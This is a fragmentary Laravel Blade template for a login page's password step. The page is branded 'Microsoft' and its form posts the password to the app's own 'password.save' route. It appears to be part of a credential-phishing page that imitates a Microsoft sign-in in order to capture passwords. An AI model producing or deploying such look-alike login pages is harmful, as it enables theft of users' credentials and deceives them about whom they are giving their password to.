...
.btn-custom:hover {
    background-color: #005fa3; /* Darker blue for hover effect */
}
...
<body style="margin: 0; padding: 0;">
    <div class="container-fluid" style="background-image: url('{{ asset('bg.jpg') }}'); background-size: cover; background-position: center center; background-repeat: no-repeat; min-height: 100vh; display: flex; justify-content: center; align-items: center;">
        <div class="row w-100">
            <div class="col-lg-6 mx-auto">
                <!-- Part 2: Password Input -->
                <div class="box" id="password-page">
                    ...
                    <form action="{{ route('password.save') }}" method="POST">
                        ...
                        <span class="align-middle h5 logoname">Microsoft</span><br><br>

                        <a href='{{ url()->previous() }}'> <i class="fas fa-arrow-left" id="back"></i> </a> &nbsp;
                        ...
                        <div class="text-right">
                            <button type="submit" class="btn-custom" id="submit-btn">Login</button>
                        </div>
                    </form>
                </div>
            </div>
    ...
    <script>
        // Optionally handle some page-specific JavaScript here
